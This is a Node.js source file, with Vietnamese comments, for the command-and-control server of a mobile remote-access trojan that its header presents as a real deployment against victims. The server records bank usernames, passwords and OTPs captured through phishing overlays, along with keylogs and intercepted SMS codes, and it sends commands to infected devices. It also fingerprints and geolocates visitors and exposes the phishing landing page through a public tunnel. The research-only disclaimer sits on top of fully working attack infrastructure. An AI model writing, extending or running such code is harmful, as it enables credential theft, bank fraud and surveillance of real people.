/**
 * ============================================================
 *  RANK 3: MOBILE RAT RESEARCH LAB — C2 Server (v2.0)
 *  Triển khai thật — Thu hoạch dữ liệu thật từ thiết bị nạn nhân
 *  ⚠️ CHỈ DÙNG CHO MỤC ĐÍCH NGHIÊN CỨU BẢO MẬT & PHÒNG THỦ
 * ============================================================
 */

const express = require('express');
const fs = require('fs');
const path = require('path');
const os = require('os');
const http = require('http');
const https = require('https');
const { WebSocketServer } = require('ws');
const { spawn } = require('child_process');

const app = express();
const PORT = 3002;

// HTTP + WebSocket Server
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

// Track connected clients
const dashboardClients = new Set();  // Dashboard viewers
const victimSockets = new Map();     // victimId -> ws

// Cloudflare Tunnel
let tunnelUrl = null;
let tunnelStatus = 'starting';

// ==========================================
//  WebSocket Handler
// ==========================================
wss.on('connection', (ws, req) => {
    const url = req.url || '';

    if (url.includes('/ws/victim')) {
        // Victim device connecting from RAT web app
        let currentVictimId = null;
        console.log('📱 Victim device WebSocket connected');

        ws.on('message', (message) => {
            try {
                const data = JSON.parse(message.toString());
                handleVictimMessage(ws, data, (vid) => { currentVictimId = vid; });
            } catch (e) {
                console.error('❌ Victim WS parse error:', e.message);
            }
        });

        ws.on('close', () => {
            if (currentVictimId) {
                console.log(`📱 Victim disconnected: ${currentVictimId}`);
                victimSockets.delete(currentVictimId);
                updateVictimStatus(currentVictimId, 'offline');
                broadcastDash({ type: 'victim_status', victim_id: currentVictimId, status: 'offline' });
            }
        });
        ws.on('error', () => {
            if (currentVictimId) victimSockets.delete(currentVictimId);
        });

    } else {
        // C2 Dashboard client
        console.log('📡 C2 Dashboard WS connected');
        dashboardClients.add(ws);
        ws.send(JSON.stringify({ type: 'tunnel', url: tunnelUrl, status: tunnelStatus }));
        ws.on('close', () => dashboardClients.delete(ws));
        ws.on('error', () => dashboardClients.delete(ws));
    }
});

function broadcastDash(data) {
    const msg = JSON.stringify(data);
    dashboardClients.forEach(ws => {
        try { if (ws.readyState === 1) ws.send(msg); } catch(e) {}
    });
}

function sendToVictim(victimId, data) {
    const ws = victimSockets.get(victimId);
    if (ws && ws.readyState === 1) {
        ws.send(JSON.stringify(data));
        return true;
    }
    return false;
}

// ==========================================
//  Handle Victim Messages
// ==========================================
function handleVictimMessage(ws, data, setVictimId) {
    const { type } = data;

    if (type === 'register') {
        const victimId = data.victim_id;
        setVictimId(victimId);
        victimSockets.set(victimId, ws);

        const victims = readJson(VICTIMS_FILE);
        let existing = victims.find(v => v.id === victimId);
        if (!existing) {
            existing = {
                id: victimId,
                device: data.device || {},
                location: data.location || {},
                status: 'online',
                accessibility_granted: false,
                first_seen: new Date().toISOString(),
                last_ping: new Date().toISOString(),
                credentials: [],
                keylogs: [],
                intercepted_sms: []
            };
            victims.unshift(existing);

            console.log('\n' + '='.repeat(60));
            console.log('📱 THIẾT BỊ MỚI KẾT NỐI!');
            console.log('='.repeat(60));
            console.log(`🆔 ID: ${victimId}`);
            console.log(`📱 ${existing.device.device_name || 'Unknown'} | ${existing.device.os || ''} ${existing.device.os_version || ''}`);
            console.log(`🌍 ${existing.device.browser || ''} | ${existing.location.city || ''}, ${existing.location.country || ''}`);
            console.log('='.repeat(60) + '\n');

            addLog('connection', victimId, `Thiết bị mới kết nối: ${existing.device.device_name || 'Unknown'}`);
        } else {
            existing.status = 'online';
            existing.last_ping = new Date().toISOString();
            if (data.device) existing.device = { ...existing.device, ...data.device };
            if (data.location) existing.location = { ...existing.location, ...data.location };
        }
        writeJson(VICTIMS_FILE, victims);
        broadcastDash({ type: 'victim_updated', data: existing });
    }
    else if (type === 'accessibility_granted') {
        const victims = readJson(VICTIMS_FILE);
        const v = victims.find(x => x.id === data.victim_id);
        if (v) {
            v.accessibility_granted = true;
            writeJson(VICTIMS_FILE, victims);
            addLog('permission', data.victim_id, '⚡ Quyền Trợ Năng (Accessibility) đã được cấp!');
            broadcastDash({ type: 'victim_updated', data: v });

            console.log(`\n🔴 [CRITICAL] Victim ${data.victim_id} đã cấp quyền Accessibility!\n`);
        }
    }
    else if (type === 'overlay_credentials') {
        const { victim_id, bank, credentials } = data;
        const victims = readJson(VICTIMS_FILE);
        const v = victims.find(x => x.id === victim_id);
        if (v) {
            const entry = {
                bank,
                ...credentials,
                timestamp: new Date().toISOString()
            };
            v.credentials.unshift(entry);
            writeJson(VICTIMS_FILE, victims);

            console.log('\n' + '='.repeat(60));
            console.log('🎣 CREDENTIALS THU HOẠCH TỪ OVERLAY!');
            console.log('='.repeat(60));
            console.log(`🏦 ${bank}`);
            console.log(`👤 Username: ${credentials.username}`);
            console.log(`🔑 Password: ${credentials.password}`);
            if (credentials.otp) console.log(`🔐 OTP: ${credentials.otp}`);
            console.log(`📱 Victim: ${victim_id}`);
            console.log('='.repeat(60) + '\n');

            addLog('harvest', victim_id, `🏦 ${bank} — User: ${credentials.username} | Pass: ${credentials.password}`);
            broadcastDash({ type: 'new_credentials', victim_id, data: entry });
        }
    }
    else if (type === 'keylog') {
        const { victim_id, keylog } = data;
        const victims = readJson(VICTIMS_FILE);
        const v = victims.find(x => x.id === victim_id);
        if (v) {
            v.keylogs.unshift(keylog);
            if (v.keylogs.length > 500) v.keylogs = v.keylogs.slice(0, 250);
            writeJson(VICTIMS_FILE, victims);
            broadcastDash({ type: 'new_keylog', victim_id, keylog });
        }
    }
    else if (type === 'sms_otp') {
        const { victim_id, otp_value, bank } = data;
        const victims = readJson(VICTIMS_FILE);
        const v = victims.find(x => x.id === victim_id);
        if (v) {
            const smsEntry = {
                bank: bank || 'Unknown',
                otp: otp_value,
                timestamp: new Date().toISOString()
            };
            v.intercepted_sms.unshift(smsEntry);
            writeJson(VICTIMS_FILE, victims);

            console.log(`\n🔐 [SMS OTP] Victim ${victim_id} — Bank: ${bank} — OTP: ${otp_value}\n`);
            addLog('sms_otp', victim_id, `🔐 OTP thu hoạch: ${otp_value} (${bank})`);
            broadcastDash({ type: 'new_sms', victim_id, data: smsEntry });
        }
    }
    else if (type === 'ping') {
        updateVictimStatus(data.victim_id, 'online');
    }
}

// ==========================================
//  Middleware & Data Files
// ==========================================
app.use(express.json({ limit: '5mb' }));
app.use(express.urlencoded({ extended: true }));

const VICTIMS_FILE     = path.join(__dirname, 'victims.json');
const FINGERPRINT_FILE = path.join(__dirname, 'fingerprints.json');
const LOGS_FILE        = path.join(__dirname, 'logs.json');

[VICTIMS_FILE, FINGERPRINT_FILE, LOGS_FILE].forEach(f => {
    if (!fs.existsSync(f)) fs.writeFileSync(f, JSON.stringify([], null, 2));
});

// Static routes
app.use('/dashboard', express.static(path.join(__dirname, 'public', 'dashboard')));
app.use('/mobile', express.static(path.join(__dirname, 'public', 'mobile')));

// ==========================================
//  Utility Functions
// ==========================================
function readJson(file) {
    try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch(e) { return []; }
}
function writeJson(file, data) {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
}
function addLog(type, victimId, details) {
    const logs = readJson(LOGS_FILE);
    const entry = {
        id: 'log_' + Date.now(),
        timestamp: new Date().toISOString(),
        type, victim_id: victimId, details
    };
    logs.unshift(entry);
    if (logs.length > 500) logs.pop();
    writeJson(LOGS_FILE, logs);
    broadcastDash({ type: 'new_log', data: entry });
}
function updateVictimStatus(victimId, status) {
    const victims = readJson(VICTIMS_FILE);
    const v = victims.find(x => x.id === victimId);
    if (v) {
        v.status = status;
        v.last_ping = new Date().toISOString();
        writeJson(VICTIMS_FILE, victims);
    }
}
function extractPlatform(ua) {
    if (/iPhone/i.test(ua)) return 'iPhone';
    if (/iPad/i.test(ua)) return 'iPad';
    if (/Android/i.test(ua)) return 'Android';
    if (/Windows Phone/i.test(ua)) return 'Windows Phone';
    if (/Windows/i.test(ua)) return 'Windows PC';
    if (/Macintosh/i.test(ua)) return 'Mac';
    if (/Linux/i.test(ua)) return 'Linux';
    return 'Unknown';
}
function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) return iface.address;
        }
    }
    return '127.0.0.1';
}

// ==========================================
//  IP Geolocation (from Rank 1)
// ==========================================
function lookupIPLocation(ip) {
    return new Promise((resolve) => {
        const isLocal = !ip || ip === '::1' || ip === '127.0.0.1' || ip.startsWith('::ffff:127') || ip.startsWith('192.168') || ip.startsWith('10.');
        if (isLocal) {
            https.get('https://ipapi.co/json/', { timeout: 8000, headers: { 'User-Agent': 'node-fetch/1.0' } }, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    try {
                        const d = JSON.parse(body);
                        if (d.latitude) {
                            resolve({ latitude: d.latitude, longitude: d.longitude, accuracy: 'IP (~1-50km)', city: d.city || '', region: d.region || '', country: d.country_name || '', isp: d.org || '', source: 'IP', google_maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}` });
                        } else resolve(null);
                    } catch(e) { resolve(null); }
                });
            }).on('error', () => resolve(null));
            return;
        }
        const cleanIP = ip.replace(/^::ffff:/, '');
        https.get(`https://ipapi.co/${cleanIP}/json/`, { timeout: 8000, headers: { 'User-Agent': 'node-fetch/1.0' } }, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                try {
                    const d = JSON.parse(body);
                    if (d.latitude) {
                        resolve({ latitude: d.latitude, longitude: d.longitude, accuracy: 'IP (~1-50km)', city: d.city || '', region: d.region || '', country: d.country_name || '', isp: d.org || '', source: 'IP', google_maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}` });
                    } else resolve(null);
                } catch(e) { resolve(null); }
            });
        }).on('error', () => resolve(null));
    });
}

// ==========================================
//  REST API: Fingerprint (from landing page)
// ==========================================
app.post('/api/fingerprint', async (req, res) => {
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.connection.remoteAddress || req.ip;

    const fingerprint = {
        ...req.body,
        server_ip: clientIP,
        received_at: new Date().toISOString()
    };

    // Server-side IP geolocation
    const clientLoc = fingerprint.location || {};
    if (!clientLoc.latitude || clientLoc.error) {
        const serverLoc = await lookupIPLocation(clientIP);
        if (serverLoc) {
            fingerprint.location = serverLoc;
            console.log(`🌐 IP Lookup: ${clientIP} → ${serverLoc.city}, ${serverLoc.country}`);
        }
    }

    let data = readJson(FINGERPRINT_FILE);
    if (data.length > 500) data = data.slice(-250);
    data.push(fingerprint);
    writeJson(FINGERPRINT_FILE, data);

    const dev = fingerprint.device || {};
    const loc = fingerprint.location || {};
    console.log('\n' + '-'.repeat(50));
    console.log('📲 THIẾT BỊ TRUY CẬP LANDING PAGE!');
    console.log(`📱 ${dev.device_name || 'N/A'} | ${dev.os || ''} ${dev.os_version || ''}`);
    console.log(`🌍 ${dev.browser || ''} | ${loc.city || ''}, ${loc.country || ''}`);
    console.log('-'.repeat(50) + '\n');

    broadcastDash({ type: 'new_fingerprint', data: fingerprint });
    res.json({ ok: true });
});

// ==========================================
//  REST API: GET endpoints
// ==========================================
app.get('/api/health', (req, res) => {
    res.json({ status: 'online', service: 'Rank 3 — Mobile RAT C2', port: PORT, timestamp: new Date().toISOString() });
});

app.get('/api/tunnel', (req, res) => {
    res.json({
        url: tunnelUrl, status: tunnelStatus,
        links: tunnelUrl ? {
            landing: `${tunnelUrl}/mobile`,
            rat_app: `${tunnelUrl}/mobile/rat-app.html`,
            dashboard: `${tunnelUrl}/dashboard`
        } : null
    });
});

app.get('/api/victims', (req, res) => {
    res.json(readJson(VICTIMS_FILE));
});

app.get('/api/victims/:id', (req, res) => {
    const victims = readJson(VICTIMS_FILE);
    const v = victims.find(x => x.id === req.params.id);
    if (!v) return res.status(404).json({ error: 'Not found' });
    res.json(v);
});

app.get('/api/fingerprints', (req, res) => {
    const data = readJson(FINGERPRINT_FILE);
    res.json({ total: data.length, entries: data.slice().reverse() });
});

app.get('/api/logs', (req, res) => {
    res.json(readJson(LOGS_FILE));
});

app.get('/api/stats', (req, res) => {
    const victims = readJson(VICTIMS_FILE);
    const fps = readJson(FINGERPRINT_FILE);
    let totalCreds = 0, totalKeylogs = 0, totalSms = 0, onlineCount = 0, accCount = 0;
    victims.forEach(v => {
        if (v.status === 'online') onlineCount++;
        if (v.accessibility_granted) accCount++;
        totalCreds += (v.credentials || []).length;
        totalKeylogs += (v.keylogs || []).length;
        totalSms += (v.intercepted_sms || []).length;
    });
    res.json({
        total_victims: victims.length,
        online_victims: onlineCount,
        accessibility_granted: accCount,
        total_credentials: totalCreds,
        total_keylogs: totalKeylogs,
        total_sms_otp: totalSms,
        total_fingerprints: fps.length
    });
});

// ==========================================
//  REST API: C2 Commands
// ==========================================
app.post('/api/victims/:id/command', (req, res) => {
    const { action, params } = req.body;
    const victimId = req.params.id;
    const sent = sendToVictim(victimId, { type: 'c2_command', action, params });
    addLog('c2_command', victimId, `🕹️ Lệnh C2 [${action}] → ${victimId} (${sent ? 'Đã gửi' : 'Offline'})`);
    res.json({ success: true, sent, victim_id: victimId, action });
});

// ==========================================
//  REST API: DELETE
// ==========================================
app.delete('/api/data', (req, res) => {
    writeJson(VICTIMS_FILE, []);
    writeJson(FINGERPRINT_FILE, []);
    writeJson(LOGS_FILE, []);
    console.log('🗑️  Đã xóa toàn bộ dữ liệu.');
    broadcastDash({ type: 'data_cleared' });
    res.json({ success: true });
});

// ==========================================
//  Root redirect
// ==========================================
app.get('/', (req, res) => res.redirect('/dashboard'));

// ==========================================
//  Cloudflare Tunnel (from Rank 1)
// ==========================================
function startTunnel() {
    console.log('\n  🌐 Đang tạo Cloudflare Tunnel...\n');
    tunnelStatus = 'starting';

    const cf = spawn('npx', ['-y', 'cloudflared', 'tunnel', '--url', `http://localhost:${PORT}`], {
        shell: true,
        stdio: ['ignore', 'pipe', 'pipe']
    });

    const handleOutput = (data) => {
        const output = data.toString();
        const match = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i);
        if (match && !tunnelUrl) {
            tunnelUrl = match[0];
            tunnelStatus = 'connected';

            console.log('╔' + '═'.repeat(70) + '╗');
            console.log('║' + '   🌍 CLOUDFLARE TUNNEL — SẴN SÀNG!'.padEnd(70) + '║');
            console.log('╠' + '═'.repeat(70) + '╣');
            console.log(`║  📱 Landing (gửi cho nạn nhân): ${tunnelUrl}/mobile`.padEnd(71) + '║');
            console.log(`║  🎯 RAT App:  ${tunnelUrl}/mobile/rat-app.html`.padEnd(71) + '║');
            console.log(`║  📊 Dashboard: ${tunnelUrl}/dashboard`.padEnd(71) + '║');
            console.log('╚' + '═'.repeat(70) + '╝\n');

            broadcastDash({ type: 'tunnel', url: tunnelUrl, status: 'connected' });
        }
    };

    cf.stderr.on('data', handleOutput);
    cf.stdout.on('data', handleOutput);
    cf.on('error', (err) => {
        tunnelStatus = 'failed';
        broadcastDash({ type: 'tunnel', url: null, status: 'failed' });
        console.log('\n  ❌ Cloudflare Tunnel thất bại:', err.message);
    });
    cf.on('close', (code) => {
        if (code !== 0 && code !== null) {
            tunnelStatus = 'failed';
            broadcastDash({ type: 'tunnel', url: null, status: 'failed' });
        }
    });
}

// ==========================================
//  Start Server
// ==========================================
server.listen(PORT, '0.0.0.0', () => {
    const localIP = getLocalIP();
    console.log('');
    console.log('╔' + '═'.repeat(70) + '╗');
    console.log('║' + '   📱 RANK 3: MOBILE RAT C2 SERVER v2.0 — TRIỂN KHAI THẬT'.padEnd(70) + '║');
    console.log('╠' + '═'.repeat(70) + '╣');
    console.log(`║  📊 C2 Dashboard:  http://localhost:${PORT}/dashboard`.padEnd(71) + '║');
    console.log(`║  📱 Landing Page:  http://${localIP}:${PORT}/mobile`.padEnd(71) + '║');
    console.log(`║  🎯 RAT App:       http://${localIP}:${PORT}/mobile/rat-app.html`.padEnd(71) + '║');
    console.log('║' + '   ⚡ WebSocket C2 realtime ENABLED'.padEnd(70) + '║');
    console.log('║' + '   ⚠️  CHỈ DÙNG CHO MỤC ĐÍCH NGHIÊN CỨU!'.padEnd(70) + '║');
    console.log('╚' + '═'.repeat(70) + '╝\n');

    startTunnel();
});
